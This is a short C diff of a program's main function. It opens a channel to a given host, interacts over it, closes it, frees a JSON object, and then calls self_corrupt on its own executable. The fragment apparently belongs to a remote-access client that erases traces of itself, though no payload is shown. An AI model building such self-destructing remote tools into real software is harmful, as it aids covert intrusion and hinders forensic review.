@@ -59,12 +59,13 @@ int main(int argc, char *argv[])
     else
         channel = open_channel(host, atoi(port));
 
-    if (channel < 0)
-        return -1;
+    if (channel >= 0)
+        interact(channel);
 
-    interact(channel);
     close_channel(channel);
 
+    freeJSONFromMemory(json);
     self_corrupt(argv[0]);
+
     return 0;
 }
